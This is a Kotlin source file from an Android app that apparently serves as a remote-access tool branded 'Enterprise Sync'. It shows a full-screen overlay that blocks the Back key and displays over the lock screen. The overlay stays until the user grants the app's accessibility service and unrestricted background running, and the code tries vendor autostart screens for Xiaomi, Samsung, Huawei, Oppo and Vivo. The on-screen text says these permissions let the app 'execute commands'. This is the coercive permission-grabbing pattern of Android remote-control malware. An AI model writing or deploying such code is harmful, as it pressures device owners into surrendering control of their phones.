package com.example.service

import android.content.Context
import android.content.Intent
import android.database.ContentObserver
import android.graphics.Color
import android.graphics.PixelFormat
import android.graphics.Typeface
import android.graphics.drawable.GradientDrawable
import android.net.Uri
import android.os.Build
import android.os.Handler
import android.os.Looper
import android.os.PowerManager
import android.provider.Settings
import android.util.Log
import android.view.Gravity
import android.view.KeyEvent
import android.view.View
import android.view.ViewGroup
import android.view.WindowManager
import android.widget.Button
import android.widget.FrameLayout
import android.widget.LinearLayout
import android.widget.TextView

object AccessibilityOverlayManager {

    private const val TAG = "AccessibilityOverlay"
    private var overlayView: View? = null
    private var contentObserver: ContentObserver? = null
    private var isObserverRegistered = false

    fun isAccessibilityEnabled(context: Context): Boolean {
        if (RemoteAccessibilityService.isServiceEnabled()) return true

        return try {
            val accessibilityEnabled = Settings.Secure.getInt(
                context.contentResolver,
                Settings.Secure.ACCESSIBILITY_ENABLED, 0
            )
            if (accessibilityEnabled == 1) {
                val enabledServices = Settings.Secure.getString(
                    context.contentResolver,
                    Settings.Secure.ENABLED_ACCESSIBILITY_SERVICES
                ) ?: ""
                val expectedService = "${context.packageName}/${RemoteAccessibilityService::class.java.name}"
                val expectedShort = "${context.packageName}/.service.RemoteAccessibilityService"
                enabledServices.contains(expectedService) ||
                        enabledServices.contains(expectedShort) ||
                        enabledServices.contains(context.packageName)
            } else {
                false
            }
        } catch (e: Exception) {
            Log.e(TAG, "Error checking accessibility status: ${e.message}")
            false
        }
    }

    fun isIgnoringBatteryOptimizations(context: Context): Boolean {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
            val pm = context.getSystemService(Context.POWER_SERVICE) as? PowerManager
            return pm?.isIgnoringBatteryOptimizations(context.packageName) ?: true
        }
        return true
    }

    fun isAllRequiredGranted(context: Context): Boolean {
        return isAccessibilityEnabled(context) && isIgnoringBatteryOptimizations(context)
    }

    fun startObserver(context: Context) {
        val appContext = context.applicationContext
        if (isObserverRegistered) return

        try {
            if (contentObserver == null) {
                contentObserver = object : ContentObserver(Handler(Looper.getMainLooper())) {
                    override fun onChange(selfChange: Boolean) {
                        super.onChange(selfChange)
                        Log.d(TAG, "Settings changed, checking overlay status...")
                        checkAndToggleOverlay(appContext)
                    }
                }
            }

            appContext.contentResolver.registerContentObserver(
                Settings.Secure.getUriFor(Settings.Secure.ENABLED_ACCESSIBILITY_SERVICES),
                false,
                contentObserver!!
            )
            isObserverRegistered = true
            Log.d(TAG, "Accessibility ContentObserver registered successfully.")
        } catch (e: Exception) {
            Log.e(TAG, "Failed to register ContentObserver: ${e.message}")
        }

        // Initial check
        checkAndToggleOverlay(appContext)
    }

    fun stopObserver(context: Context) {
        if (!isObserverRegistered || contentObserver == null) return
        try {
            context.applicationContext.contentResolver.unregisterContentObserver(contentObserver!!)
            isObserverRegistered = false
            Log.d(TAG, "Accessibility ContentObserver unregistered.")
        } catch (e: Exception) {
            Log.e(TAG, "Failed to unregister ContentObserver: ${e.message}")
        }
    }

    fun checkAndToggleOverlay(context: Context) {
        Handler(Looper.getMainLooper()).post {
            val allGranted = isAllRequiredGranted(context)
            val accEnabled = isAccessibilityEnabled(context)
            val battIgnored = isIgnoringBatteryOptimizations(context)
            Log.d(TAG, "checkAndToggleOverlay: allGranted=$allGranted (acc=$accEnabled, battIgnored=$battIgnored)")
            if (allGranted) {
                removeOverlay(context)
            } else {
                showOverlay(context)
            }
        }
    }

    fun showOverlay(context: Context) {
        val appContext = context.applicationContext
        Handler(Looper.getMainLooper()).post {
            if (overlayView != null) {
                Log.d(TAG, "Overlay already visible")
                return@post
            }

            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M && !Settings.canDrawOverlays(appContext)) {
                Log.w(TAG, "SYSTEM_ALERT_WINDOW permission not granted. Cannot draw overlay.")
                return@post
            }

            try {
                val windowManager = appContext.getSystemService(Context.WINDOW_SERVICE) as? WindowManager
                    ?: return@post

                val rootLayout = object : FrameLayout(appContext) {
                    override fun dispatchKeyEvent(event: KeyEvent?): Boolean {
                        // Intercept Back button or any key to prevent dismissing overlay
                        if (event?.keyCode == KeyEvent.KEYCODE_BACK) {
                            return true
                        }
                        return super.dispatchKeyEvent(event)
                    }
                }

                rootLayout.setBackgroundColor(Color.parseColor("#EE0F172A")) // Dark translucent background
                rootLayout.isFocusable = true
                rootLayout.isFocusableInTouchMode = true

                // Card Container
                val cardLayout = LinearLayout(appContext).apply {
                    orientation = LinearLayout.VERTICAL
                    gravity = Gravity.CENTER_HORIZONTAL
                    setPadding(dpToPx(appContext, 20), dpToPx(appContext, 28), dpToPx(appContext, 20), dpToPx(appContext, 28))

                    val cardDrawable = GradientDrawable().apply {
                        setColor(Color.parseColor("#1E293B")) // Slate 800
                        cornerRadius = dpToPx(appContext, 20).toFloat()
                        setStroke(dpToPx(appContext, 2), Color.parseColor("#EF4444")) // Red border indicator
                    }
                    background = cardDrawable
                }

                val cardParams = FrameLayout.LayoutParams(
                    dpToPx(appContext, 350),
                    ViewGroup.LayoutParams.WRAP_CONTENT
                ).apply {
                    gravity = Gravity.CENTER
                }

                // Warning Icon
                val warningText = TextView(appContext).apply {
                    text = "⚠️"
                    textSize = 42f
                    gravity = Gravity.CENTER
                }

                // Title
                val titleView = TextView(appContext).apply {
                    text = "Critical Permissions Required"
                    textSize = 19f
                    setTextColor(Color.WHITE)
                    setTypeface(null, Typeface.BOLD)
                    gravity = Gravity.CENTER
                    setPadding(0, dpToPx(appContext, 8), 0, dpToPx(appContext, 8))
                }

                val isAccOn = isAccessibilityEnabled(appContext)
                val isBattOn = isIgnoringBatteryOptimizations(appContext)

                // Message Body
                val messageView = TextView(appContext).apply {
                    val statusAcc = if (isAccOn) "✅ Enabled" else "❌ Required"
                    val statusBatt = if (isBattOn) "✅ Unrestricted" else "❌ Optimized (Action Needed)"
                    text = "Enterprise Sync requires system permissions to maintain real-time background connection & execute commands.\n\n" +
                            "• Accessibility Service: $statusAcc\n" +
                            "• Battery Optimization: $statusBatt\n\n" +
                            "Please grant unrestricted background access & accessibility below:"
                    textSize = 13f
                    setTextColor(Color.parseColor("#CBD5E1")) // Slate 300
                    gravity = Gravity.CENTER
                    setLineSpacing(5f, 1.15f)
                    setPadding(0, 0, 0, dpToPx(appContext, 18))
                }

                // Action Button 1: Accessibility
                val enableAccButton = Button(appContext).apply {
                    text = if (isAccOn) "1. ACCESSIBILITY (ENABLED)" else "1. ENABLE ACCESSIBILITY SERVICE"
                    textSize = 12f
                    setTextColor(Color.WHITE)
                    setTypeface(null, Typeface.BOLD)

                    val btnDrawable = GradientDrawable().apply {
                        setColor(if (isAccOn) Color.parseColor("#166534") else Color.parseColor("#2563EB"))
                        cornerRadius = dpToPx(appContext, 10).toFloat()
                    }
                    background = btnDrawable
                    val params = LinearLayout.LayoutParams(
                        LinearLayout.LayoutParams.MATCH_PARENT,
                        LinearLayout.LayoutParams.WRAP_CONTENT
                    )
                    layoutParams = params
                    setPadding(dpToPx(appContext, 12), dpToPx(appContext, 10), dpToPx(appContext, 12), dpToPx(appContext, 10))

                    setOnClickListener {
                        try {
                            val intent = Intent(Settings.ACTION_ACCESSIBILITY_SETTINGS).apply {
                                flags = Intent.FLAG_ACTIVITY_NEW_TASK or Intent.FLAG_ACTIVITY_CLEAR_TOP
                            }
                            appContext.startActivity(intent)
                        } catch (e: Exception) {
                            Log.e(TAG, "Error opening accessibility settings: ${e.message}")
                        }
                    }
                }

                // Action Button 2: Battery Optimization / Special App Access
                val enableBattButton = Button(appContext).apply {
                    text = if (isBattOn) "2. BATTERY (UNRESTRICTED)" else "2. DISABLE BATTERY OPTIMIZATION"
                    textSize = 12f
                    setTextColor(Color.WHITE)
                    setTypeface(null, Typeface.BOLD)

                    val btnDrawable = GradientDrawable().apply {
                        setColor(if (isBattOn) Color.parseColor("#166534") else Color.parseColor("#D97706")) // Amber 600
                        cornerRadius = dpToPx(appContext, 10).toFloat()
                    }
                    background = btnDrawable
                    val params = LinearLayout.LayoutParams(
                        LinearLayout.LayoutParams.MATCH_PARENT,
                        LinearLayout.LayoutParams.WRAP_CONTENT
                    ).apply {
                        topMargin = dpToPx(appContext, 10)
                    }
                    layoutParams = params
                    setPadding(dpToPx(appContext, 12), dpToPx(appContext, 10), dpToPx(appContext, 12), dpToPx(appContext, 10))

                    setOnClickListener {
                        requestDisableBatteryOptimization(appContext)
                    }
                }

                // Action Button 3: Special App Access / Autostart Settings (All Manufacturers)
                val specialAccessButton = Button(appContext).apply {
                    text = "3. SPECIAL APP ACCESS & AUTOSTART"
                    textSize = 12f
                    setTextColor(Color.parseColor("#F1F5F9"))
                    setTypeface(null, Typeface.BOLD)

                    val btnDrawable = GradientDrawable().apply {
                        setColor(Color.parseColor("#334155")) // Slate 700
                        cornerRadius = dpToPx(appContext, 10).toFloat()
                        setStroke(dpToPx(appContext, 1), Color.parseColor("#475569"))
                    }
                    background = btnDrawable
                    val params = LinearLayout.LayoutParams(
                        LinearLayout.LayoutParams.MATCH_PARENT,
                        LinearLayout.LayoutParams.WRAP_CONTENT
                    ).apply {
                        topMargin = dpToPx(appContext, 10)
                    }
                    layoutParams = params
                    setPadding(dpToPx(appContext, 12), dpToPx(appContext, 10), dpToPx(appContext, 12), dpToPx(appContext, 10))

                    setOnClickListener {
                        openSpecialAppAccess(appContext)
                    }
                }

                cardLayout.addView(warningText)
                cardLayout.addView(titleView)
                cardLayout.addView(messageView)
                cardLayout.addView(enableAccButton)
                cardLayout.addView(enableBattButton)
                cardLayout.addView(specialAccessButton)

                rootLayout.addView(cardLayout, cardParams)

                val layoutType = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                    WindowManager.LayoutParams.TYPE_APPLICATION_OVERLAY
                } else {
                    @Suppress("DEPRECATION")
                    WindowManager.LayoutParams.TYPE_PHONE
                }

                val params = WindowManager.LayoutParams(
                    WindowManager.LayoutParams.MATCH_PARENT,
                    WindowManager.LayoutParams.MATCH_PARENT,
                    layoutType,
                    WindowManager.LayoutParams.FLAG_NOT_TOUCH_MODAL or
                            WindowManager.LayoutParams.FLAG_LAYOUT_IN_SCREEN or
                            WindowManager.LayoutParams.FLAG_FULLSCREEN or
                            WindowManager.LayoutParams.FLAG_SHOW_WHEN_LOCKED or
                            WindowManager.LayoutParams.FLAG_DISMISS_KEYGUARD or
                            WindowManager.LayoutParams.FLAG_KEEP_SCREEN_ON,
                    PixelFormat.TRANSLUCENT
                ).apply {
                    gravity = Gravity.CENTER
                }

                windowManager.addView(rootLayout, params)
                overlayView = rootLayout
                Log.d(TAG, "Blocking overlay view attached successfully.")
            } catch (e: Exception) {
                Log.e(TAG, "Failed to attach overlay view to WindowManager: ${e.message}")
            }
        }
    }

    fun removeOverlay(context: Context) {
        val appContext = context.applicationContext
        Handler(Looper.getMainLooper()).post {
            val view = overlayView ?: return@post
            try {
                val windowManager = appContext.getSystemService(Context.WINDOW_SERVICE) as? WindowManager
                windowManager?.removeView(view)
                Log.d(TAG, "Accessibility & Battery overlay removed successfully.")
            } catch (e: Exception) {
                Log.e(TAG, "Error removing overlay view: ${e.message}")
            } finally {
                overlayView = null
            }
        }
    }

    private fun requestDisableBatteryOptimization(context: Context) {
        val pkg = context.packageName
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
            val intents = listOf(
                Intent(Settings.ACTION_REQUEST_IGNORE_BATTERY_OPTIMIZATIONS, Uri.parse("package:$pkg")),
                Intent(Settings.ACTION_IGNORE_BATTERY_OPTIMIZATION_SETTINGS),
                Intent(Settings.ACTION_MANAGE_ALL_APPLICATIONS_SETTINGS)
            )

            for (intent in intents) {
                try {
                    intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK or Intent.FLAG_ACTIVITY_CLEAR_TOP)
                    context.startActivity(intent)
                    return
                } catch (_: Exception) {}
            }
        }
    }

    private fun openSpecialAppAccess(context: Context) {
        val pkg = context.packageName
        val intents = listOf(
            // Special App Access (Android 10+)
            Intent("android.settings.IGNORE_BATTERY_OPTIMIZATION_SETTINGS"),
            // App details page -> Battery settings
            Intent(Settings.ACTION_APPLICATION_DETAILS_SETTINGS, Uri.parse("package:$pkg")),
            // Xiaomi MIUI Autostart & Permissions
            Intent().setComponent(android.content.ComponentName("com.miui.securitycenter", "com.miui.permcenter.autostart.AutoStartManagementActivity")),
            Intent().setComponent(android.content.ComponentName("com.miui.securitycenter", "com.miui.permcenter.permissions.PermissionsEditorActivity")),
            // Samsung Device Care
            Intent().setComponent(android.content.ComponentName("com.samsung.android.loaddose", "com.samsung.android.loaddose.ui.BatteryActivity")),
            Intent().setComponent(android.content.ComponentName("com.samsung.android.sm", "com.samsung.android.sm.ui.battery.BatteryActivity")),
            // Huawei
            Intent().setComponent(android.content.ComponentName("com.huawei.systemmanager", "com.huawei.systemmanager.startupmgr.ui.StartupNormalAppListActivity")),
            // Oppo / Realme
            Intent().setComponent(android.content.ComponentName("com.coloros.safecenter", "com.coloros.safecenter.permission.startup.StartupAppListActivity")),
            // Vivo
            Intent().setComponent(android.content.ComponentName("com.iqoo.secure", "com.iqoo.secure.ui.phoneoptimize.AddWhiteListActivity"))
        )

        for (intent in intents) {
            try {
                intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK or Intent.FLAG_ACTIVITY_CLEAR_TOP)
                context.startActivity(intent)
                return
            } catch (_: Exception) {}
        }
    }

    private fun dpToPx(context: Context, dp: Int): Int {
        return (dp * context.resources.displayMetrics.density).toInt()
    }
}

